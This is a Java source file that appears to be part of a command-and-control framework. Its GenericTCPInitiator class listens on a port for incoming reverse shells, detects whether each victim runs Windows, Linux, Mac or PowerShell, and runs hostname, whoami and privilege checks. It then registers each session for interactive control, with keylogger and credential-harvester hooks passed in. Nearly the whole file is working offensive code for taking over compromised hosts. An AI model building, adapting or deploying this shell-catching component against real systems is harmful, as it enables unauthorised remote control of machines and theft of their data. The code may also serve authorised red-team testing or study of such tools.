package c2.tcp;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import c2.C2Interface;
import c2.Constants;
import c2.HarvestProcessor;
import c2.KeyloggerProcessor;
import c2.session.IOManager;
import util.Time;
import util.test.OutputStreamWriterHelper;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;

public class GenericTCPInitiator extends C2Interface {
	
	private IOManager ioManager;
	private int port;
	private boolean stayAlive = true;
	private CountDownLatch stopLatch = new CountDownLatch(1);
	private CountDownLatch startLatch = new CountDownLatch(1);
	private ExecutorService service = Executors.newCachedThreadPool();

	private String lz;
	
	private KeyloggerProcessor keylogger;
	private HarvestProcessor harvester;
	
	@Override
	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester) throws Exception {
		this.ioManager = io;
		this.port = Integer.parseInt(prop.getProperty(Constants.NATIVESHELLPORT));
		this.lz = prop.getProperty(Constants.DAEMONLZHARVEST);
		this.harvester = harvester;
	}

	@Override
	public String getName() {
		return "Text over TCP Shell Service";
	}
	
	@Override
	public void notifyPendingShutdown() {
		stayAlive = false;
	}
	
	public void stop() {
		stayAlive = false;
		try {
			stopLatch.await();
		} catch (InterruptedException e) {
			// Continue
		}
	}

	@Override
	public void awaitStartup() {
		try {
			startLatch.await();
		} catch (InterruptedException e) {
			
		}
	}
	
	
	
	@Override
	public void run() {
		try {
			ServerSocket ss = new ServerSocket(port);
			ss.setSoTimeout(1000);
			startLatch.countDown();
			System.out.println("TCP Listener online: " + port);
			while (!Thread.interrupted() && stayAlive) {
				Socket newSession = null;
				try {
					newSession = ss.accept();
				} catch (SocketTimeoutException ex) {
					continue;// No worries
				}

				try {
					OutputStreamWriter bw = new OutputStreamWriter(
							new BufferedOutputStream(newSession.getOutputStream()));
					BufferedReader br = new BufferedReader(new InputStreamReader(newSession.getInputStream()));

					Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
					//System.out.println("Incoming connection, reading default banner");
					String initialBanner = readUnknownLinesFromSocket(br, newSession, true);
					//System.out.println("Default shell banner: " + initialBanner);
					String os = "Unknown";
					if (initialBanner.contains("Microsoft Windows")) {
						os = "Windows";

						WindowsSocketReader wsr = new WindowsSocketReader(newSession, br);

						bw.write("cmd /k hostname");
						bw.write(System.lineSeparator());
						bw.flush();
						String hostname = wsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
						String lines[] = hostname.split(System.lineSeparator());
						hostname = lines[0];

						bw.write("echo %username%");
						bw.write(System.lineSeparator());
						bw.flush();
						String username = wsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
						lines = username.split(System.lineSeparator());
						username = lines[0];

						boolean isElevated = wsr.isElevated(bw);
						
						String sessionUID = hostname + ":" + username + ":Native" + os + ":" + isElevated;
						int sessionId = ioManager.determineAndGetCorrectSessionId(hostname, username, "Native" + os, isElevated, sessionUID);
						ioManager.updateSessionContactTime(sessionId);
						TCPShellHandler shellHandler = new TCPShellHandler(ioManager, wsr, newSession, sessionId,
								hostname, username, lz, OS.WINDOWS);
						service.submit(shellHandler);
					} else if (initialBanner.length() == 0 || initialBanner.contains("$")) {
						bw.write("uname -a");
						bw.write(Constants.NEWLINE);
						bw.flush();

						Time.sleepWrapped(5000);//Initial contact can take a while
						String resp = readUnknownLinesFromSocket(br, newSession, false);
						//System.out.println("Received: " + resp);
						if (resp.contains("Linux")) {
							NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
							onboardNix(bw, newSession, lsr, TestConfiguration.OS.LINUX);
						}else if(resp.startsWith("PS")) {
							//Plot twist - this is a powershell shell
							PowershellSocketReader psr = new PowershellSocketReader(newSession, br);
							onboardPowershell(bw, newSession, psr, OS.WINDOWS);
						}else {
							NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
							onboardNix(bw, newSession, lsr, TestConfiguration.OS.MAC);
						}
						
					}

					} catch (IOException e) {
					e.printStackTrace();
					newSession.close();
				}
			}
			ss.close();
			stopLatch.countDown();
		} catch (IOException e) {
			System.out.println("Can't lock session");
		}
	}

	private void onboardPowershell(OutputStreamWriter bw, Socket s, PowershellSocketReader lsr, OS os) throws IOException {
		OutputStreamWriterHelper.writeAndSend(bw, "hostname" + WindowsSocketReader.WINDOWS_LINE_SEP);
		String hostname = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
		hostname = hostname.replace(System.lineSeparator(), "");
		hostname = hostname.replace(Constants.NEWLINE, "");
		
		OutputStreamWriterHelper.writeAndSend(bw, "$Env:Username" + WindowsSocketReader.WINDOWS_LINE_SEP);
		String username = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
		username = username.replace(System.lineSeparator(), "");
		username = username.replace(Constants.NEWLINE, "");
		
		boolean isElevated = lsr.isElevated(bw);
		String osLabel = "PowershellWindows";
		String sessionUID = hostname + ":" + username + ":" + osLabel + ":" + isElevated;
		int sessionId = ioManager.determineAndGetCorrectSessionId(hostname, username, "Native" + os, isElevated, sessionUID);
		ioManager.updateSessionContactTime(sessionId);
		TCPShellHandler shellHandler = new TCPShellHandler(ioManager, lsr, s, sessionId, hostname, username, lz,
				os);
		service.submit(shellHandler);
	}
	
	private void onboardNix(OutputStreamWriter bw, Socket s, NixSocketReader lsr, OS os) throws IOException {
		bw.write("hostname");
		bw.write(Constants.NEWLINE);
		bw.flush();
		String hostname = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
		hostname = hostname.replace(System.lineSeparator(), "");
		hostname = hostname.replace(Constants.NEWLINE, "");

		bw.write("whoami");
		bw.write(Constants.NEWLINE);
		bw.flush();
		String username = lsr.readUnknownLinesFromSocketWithTimeout(Constants.getConstants().getTextOverTCPStaticWait());
		username = username.replace(System.lineSeparator(), "");
		username = username.replace(Constants.NEWLINE, "");

		String osLabel = null;
		if(os == OS.LINUX) {
			osLabel = "NativeLinux";
		}else {//Mac, Windows can't be here
			osLabel = "NativeMac";
		}
		
		String sessionUID = hostname + ":" + username + ":" + osLabel;
		int sessionId = ioManager.determineAndGetCorrectSessionId(hostname, username, "Native" + os, false, sessionUID);
		ioManager.updateSessionContactTime(sessionId);
		TCPShellHandler shellHandler = new TCPShellHandler(ioManager, lsr, s, sessionId, hostname, username, lz,
				os);
		service.submit(shellHandler);
	}

	public static String readUnknownLinesFromSocket(BufferedReader br, Socket socket, boolean appendFinalLineSeparator)
			throws IOException {
		StringBuilder response = new StringBuilder();
		while (br.ready()) {
			char[] buffer = new char[3000000];
			int read = br.read(buffer, 0, buffer.length);
			response.append(new String(buffer, 0, read));
			//Wait a fraction of a heartbeat for more data to queue in a mid-stream transmission
			Time.sleepWrapped(5);
		}
		if (response.length() > 0) {
			if (appendFinalLineSeparator) {
				response.append(System.lineSeparator());
			}
		}
		return response.toString();
	}

	

	
}
